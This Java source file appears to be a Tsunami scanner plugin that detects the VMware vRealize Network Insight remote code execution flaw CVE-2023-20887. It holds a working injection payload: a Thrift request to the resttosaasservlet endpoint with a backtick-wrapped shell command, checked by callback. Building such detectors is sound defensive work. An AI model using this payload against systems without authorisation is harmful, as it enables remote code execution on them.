/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202320887;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.data.NetworkServiceUtils.buildWebApplicationRootUrl;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects VMware vRealize Network Insight RCE CVE-2023-20887. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "VMware vRealize Network Insight RCE CVE-2023-20887 Detector",
    version = "0.1",
    description = "This detector checks VMware vRealize Network Insight RCE (CVE-2023-20887)",
    author = "secureness",
    bootstrapModule = Cve202320887DetectorBootstrapModule.class)
public final class Cve202320887Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  @VisibleForTesting static final String VULNERABLE_REQUEST_PATH = "saas./resttosaasservlet";
  private static final String HTTP_BODY =
      "[1,\"createSupportBundle\",1,0,{\"1\":{\"str\":\"1111\"},\"2\":{\"str\":\"`%s`\"},\"3\":{\"str\":\"value3\"},\"4\":{\"lst\":[\"str\",2,\"AAAA\",\"BBBB\"]}}]";

  private final Clock utcClock;
  private final HttpClient httpClient;

  private final PayloadGenerator payloadGenerator;

  @Inject
  Cve202320887Detector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {

    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setTrustAllCertificates(true).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Cve202320887Detector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    if(payloadGenerator.isCallbackServerEnabled()){
        try {
          return isVulnerableWithCallback(networkService);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }
    return false;
  }

  private boolean isVulnerableWithCallback(NetworkService networkService) throws InterruptedException {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    Payload payload = payloadGenerator.generate(config);
    String cmd = payload.getPayload();

    sendRequest(networkService, String.format(HTTP_BODY, cmd));
    Thread.sleep(10000);
    return payload.checkIfExecuted();
  }

  private void sendRequest(NetworkService networkService, String Payload) {
    HttpHeaders httpHeaders =
        HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/x-thrift").build();

    String targetVulnerabilityUrl = buildTarget(networkService) + VULNERABLE_REQUEST_PATH;
    try {
      httpClient.send(
          post(targetVulnerabilityUrl)
              .setHeaders(httpHeaders)
              .setRequestBody(ByteString.copyFromUtf8(Payload))
              .build(),
          networkService);
    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
    }
  }

  private static String buildTarget(NetworkService networkService) {
    return buildWebApplicationRootUrl(networkService);
  }

  @VisibleForTesting
  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE-2023-20887"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("VMware vRealize Network Insight RCE (CVE-2023-20887)")
                .setDescription(
                    "VMware vRealize Network Insight Versions 6.x Running On any kind of devices are subject to a remote code execution vulnerability."
                        + " Please refer to https://kb.vmware.com/s/article/92684 to fix this critical vulnerability"))
        .build();
  }
}
